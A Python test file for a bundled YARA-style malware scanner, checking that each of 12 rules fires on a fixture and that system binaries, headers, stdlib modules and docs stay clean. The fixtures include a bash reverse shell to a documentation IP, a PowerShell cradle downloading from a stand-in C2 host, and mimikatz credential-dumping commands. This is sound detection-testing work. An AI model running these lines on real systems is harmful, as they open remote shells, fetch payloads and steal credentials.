"""Negative and positive test corpus for bundled YARA-style scanner.

Step 1 Review Requirement 7:
1. True-positive tests for all 12 hardened bundled YARA rules.
2. Independent benign corpus from system binaries (/usr/bin/), system headers
   (/usr/include/), Python stdlib, and system docs (/usr/share/doc) that does
   NOT rely on frontend build artifacts or the repo's own source files.
"""

import os
from pathlib import Path

from ..services import static_analysis, yara


def test_hardened_bundled_yara_rules_true_positives():
    """Verify that every one of the 12 bundled rules reliably detects its intended artifact."""
    positive_fixtures: dict[str, bytes] = {
        "mz-header": b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff",
        "elf-header": b"\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00",
        "macho-header": b"\xfe\xed\xfa\xce\x00\x00\x00\x00\x00\x00\x00\x00",
        "powershell-download-cradle": b"$wc = New-Object System.Net.WebClient; IEX($wc.DownloadString('http://c2.xyz/payload.ps1'))",
        "encoded-powershell": b"powershell.exe -ExecutionPolicy Bypass -EncodedCommand JABjACAAPQAgAE4AZQB3...",
        "meterpreter": b"\x90\x90\x90/meterpreter/reverse_tcp\x00ReflectiveLoader\x00",
        "cobaltstrike": b"\x00\x00\x00windows/beacon_https/reverse_https\x00kerberos\x00ticket",
        "mimikatz": b"privilege::debug\nsekurlsa::logonpasswords\nlsadump::sam\n",
        "ransom-note": b"ATTENTION: All your files have been encrypted!\nSend 0.5 bitcoin to our wallet address for the decryptor tool.",
        "reverse-shell-bash": b"/bin/bash -i >& /dev/tcp/198.51.100.44/4444 0>&1\n",
        "office-macro": b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1...Sub Auto_Open()\nMsgBox 'pwned'\nEnd Sub",
        "lnk-command": b"\x4c\x00\x00\x00\x01\x14\x02\x00...cmd.exe /c start calc.exe",
    }

    # Verify every bundled rule is tested
    bundled_names = {r.name for r in yara.RULES}
    assert set(positive_fixtures.keys()) == bundled_names, "Every bundled rule must have a positive test fixture"

    for rule_name, payload in positive_fixtures.items():
        hits = yara.scan_sample(payload)
        hit_names = [h["name"] for h in hits]
        assert rule_name in hit_names, f"Expected rule '{rule_name}' to trigger on its positive fixture, got {hit_names}"


def test_system_binaries_elf_scan():
    """Independent benign corpus: Real /usr/bin/ ELF system binaries.

    Must match 'elf-header' (valid ELF binary), but must NEVER trigger
    any malware rule (meterpreter, cobaltstrike, mimikatz, ransom-note, etc.).
    """
    elf_candidates = ["ls", "cat", "grep", "find", "sed", "env", "head", "tail", "wc", "id"]
    tested = 0
    for name in elf_candidates:
        p = Path("/usr/bin") / name
        if p.exists() and p.is_file():
            try:
                data = p.read_bytes()
                hits = yara.scan_sample(data)
                hit_names = [h["name"] for h in hits]
                # Valid ELF must match elf-header only
                assert hit_names == ["elf-header"], f"Expected only ['elf-header'] for {name}, got {hit_names}"
                tested += 1
            except PermissionError:
                continue

    assert tested >= 5, f"Expected to test at least 5 system binaries, tested {tested}"


def test_system_c_headers_clean():
    """Independent benign corpus: C library headers from /usr/include/.

    Must have zero YARA rule matches.
    """
    include_dir = Path("/usr/include")
    headers = ["stdio.h", "stdlib.h", "unistd.h", "string.h", "fcntl.h", "errno.h", "signal.h"]
    tested = 0
    for h in headers:
        p = include_dir / h
        if p.exists() and p.is_file():
            try:
                data = p.read_bytes()
                hits = yara.scan_sample(data)
                assert hits == [], f"Expected 0 YARA hits on {h}, got {hits}"
                tested += 1
            except PermissionError:
                continue

    assert tested >= 3, f"Expected to test at least 3 system headers, tested {tested}"


def test_python_stdlib_modules_clean():
    """Independent benign corpus: Standard library python modules.

    Must have zero YARA rule matches.
    """
    stdlib_dir = Path(os.__file__).parent
    modules = ["os.py", "pathlib.py", "shutil.py", "glob.py", "tarfile.py", "subprocess.py", "hashlib.py"]
    tested = 0
    for mod in modules:
        p = stdlib_dir / mod
        if p.exists() and p.is_file():
            try:
                data = p.read_bytes()
                hits = yara.scan_sample(data)
                assert hits == [], f"Expected 0 YARA hits on stdlib {mod}, got {hits}"
                tested += 1
            except PermissionError:
                continue

    assert tested >= 4, f"Expected to test at least 4 python stdlib modules, tested {tested}"


def test_system_files_clean_scan():
    """System configuration files (/etc/hosts, /etc/os-release) must not trigger YARA rules."""
    for sys_path in (Path("/etc/hosts"), Path("/etc/os-release"), Path("/etc/resolv.conf")):
        if sys_path.exists() and sys_path.is_file():
            try:
                data = sys_path.read_bytes()
                hits = yara.scan_sample(data)
                assert hits == [], f"Expected 0 YARA hits on system file {sys_path}, got {hits}"
            except PermissionError:
                pass


def test_usr_share_doc_files_clean_scan():
    """System documentation files from /usr/share/doc must not match malware rules."""
    doc_dir = Path("/usr/share/doc")
    if doc_dir.exists() and doc_dir.is_dir():
        count = 0
        for doc_file in doc_dir.rglob("*"):
            if doc_file.is_file() and doc_file.stat().st_size < 100_000:
                try:
                    data = doc_file.read_bytes()
                    hits = yara.scan_sample(data)
                    assert hits == [], f"Expected 0 YARA hits on {doc_file}, got {hits}"
                    count += 1
                    if count >= 15:
                        break
                except (PermissionError, OSError):
                    continue


def test_benign_pdf_structure_clean():
    """Benign PDF file structure must not trigger malware signatures."""
    benign_pdf = (
        b"%PDF-1.7\n"
        b"1 0 obj\n"
        b"<< /Type /Catalog /Pages 2 0 R >>\n"
        b"endobj\n"
        b"2 0 obj\n"
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>\n"
        b"endobj\n"
        b"3 0 obj\n"
        b"<< /Type /Page /Parent 2 0 R /Resources <<>> /Contents 4 0 R >>\n"
        b"endobj\n"
        b"4 0 obj\n"
        b"<< /Length 44 >>\n"
        b"stream\n"
        b"BT /F1 12 Tf 72 712 Td (Hello OutPost Analyst) Tj ET\n"
        b"endstream\n"
        b"endobj\n"
        b"xref\n"
        b"0 5\n"
        b"0000000000 65535 f \n"
        b"0000000010 00000 n \n"
        b"0000000060 00000 n \n"
        b"0000000120 00000 n \n"
        b"0000000195 00000 n \n"
        b"trailer\n"
        b"<< /Size 5 /Root 1 0 R >>\n"
        b"startxref\n"
        b"290\n"
        b"%%EOF\n"
    )
    hits = yara.scan_sample(benign_pdf)
    assert hits == [], f"Expected 0 YARA hits on benign PDF structure, got {hits}"

    res = static_analysis.analyze_sample(benign_pdf)
    assert res.get("static_severity") not in ("malicious", "suspicious")


def test_benign_system_and_script_files_clean():
    benign_script = b"#!/bin/bash\necho 'Deploying application v1.2'\nmkdir -p /tmp/build && cd /tmp/build\nexit 0\n"
    hits = yara.scan_sample(benign_script)
    assert hits == [], f"Expected 0 YARA hits on benign script, got {hits}"

    benign_json = b'{"name": "test-project", "version": "1.0.0", "scripts": {"test": "pytest"}}\n'
    hits_json = yara.scan_sample(benign_json)
    assert hits_json == [], f"Expected 0 YARA hits on JSON config, got {hits_json}"
